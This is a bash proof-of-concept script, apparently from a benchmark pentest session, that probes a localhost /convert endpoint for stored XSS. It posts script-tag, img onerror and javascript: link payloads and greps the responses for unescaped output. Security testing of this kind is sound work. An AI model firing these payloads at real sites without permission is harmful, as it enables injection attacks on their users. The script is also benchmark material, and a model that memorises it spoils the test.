#!/bin/bash
# POC: Demonstrates Stored XSS vulnerability via markdown_text parameter in /convert endpoint. Tests script tag injection, event handler injection, and JavaScript protocol injection.
# Target: ./repo
# Created: 2025-11-04T20:06:10.255Z
# Session: benchmark-XBEN-033-24-mhkzvt57

# Stored XSS via Markdown HTML Tags POC
# Target: POST /convert endpoint
# Parameter: markdown_text

TARGET_URL="http://localhost:8080/convert"
RESULTS=""

echo "=========================================="
echo "Stored XSS in Markdown Conversion POC"
echo "=========================================="
echo ""

# Test 1: Script Tag Injection
echo "[*] Test 1: Script Tag Injection"
PAYLOAD="<script>alert(1)</script>"
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "markdown_text=$PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "<script>"; then
    echo "[+] VULNERABLE: Script tag passed through unescaped"
    RESULTS="${RESULTS}[+] Script Tag Injection: VULNERABLE\n"
else
    echo "[-] Not vulnerable to script tag injection"
    RESULTS="${RESULTS}[-] Script Tag Injection: NOT VULNERABLE\n"
fi
echo ""

# Test 2: Image onerror Event Handler
echo "[*] Test 2: Image onerror Event Handler"
PAYLOAD="<img src=x onerror=alert(1)>"
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "markdown_text=$PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "onerror"; then
    echo "[+] VULNERABLE: Event handler passed through unescaped"
    RESULTS="${RESULTS}[+] Event Handler Injection: VULNERABLE\n"
else
    echo "[-] Not vulnerable to event handler injection"
    RESULTS="${RESULTS}[-] Event Handler Injection: NOT VULNERABLE\n"
fi
echo ""

# Test 3: JavaScript Protocol in Link
echo "[*] Test 3: JavaScript Protocol in Link"
PAYLOAD="[link](javascript:alert(1))"
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "markdown_text=$PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "javascript:"; then
    echo "[+] VULNERABLE: JavaScript protocol passed through unescaped"
    RESULTS="${RESULTS}[+] JavaScript Protocol: VULNERABLE\n"
else
    echo "[-] Not vulnerable to JavaScript protocol injection"
    RESULTS="${RESULTS}[-] JavaScript Protocol: NOT VULNERABLE\n"
fi
echo ""

# Summary
echo "=========================================="
echo "Summary:"
echo "=========================================="
echo -e "$RESULTS"